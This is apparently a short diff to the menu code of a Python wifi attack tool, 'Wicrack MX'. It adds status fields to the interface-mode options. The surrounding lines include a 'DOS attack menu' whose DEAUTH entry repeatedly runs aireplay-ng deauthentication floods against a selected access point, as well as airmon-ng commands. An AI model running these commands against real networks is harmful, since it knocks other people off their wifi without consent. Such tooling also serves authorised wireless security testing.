@@ -66,9 +66,9 @@ def set_data():
     menu_data = {
       'title': "Wicrack MX", 'type': MENU, 'subtitle': "Selected interface: " + selected_interface + " Interface mode: " + interface_mode + " Target: " + target, 'options': [
         { 'title': "Select network interface", 'type': MENU, 'subtitle': "Selected interface: " + selected_interface, 'options': list2 },
-        { 'title': "Put interface in monitor mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng start ' + selected_interface },
-        { 'title': "Put interface in managed mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng stop ' + selected_interface + 'mon' },
-        { 'title': "Fix network issues", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng check kill \n sudo service NetworkManager restart' },
+        { 'title': "Put interface in monitor mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng start ' + selected_interface, 'status': 'monitor' },
+        { 'title': "Put interface in managed mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng stop ' + selected_interface + 'mon', 'status': 'managed' },
+        { 'title': "Fix network issues", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng check kill \n sudo service NetworkManager restart', 'status': 'null' },
         { 'title': "Select Wifi target", 'type': WIFISEL, 'subtitle': "selected target: " + target, 'options': wifilist },
         { 'title': "DOS attack menu", 'type': MENU, 'subtitle': "DOS attak menu", 'options': [
           {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
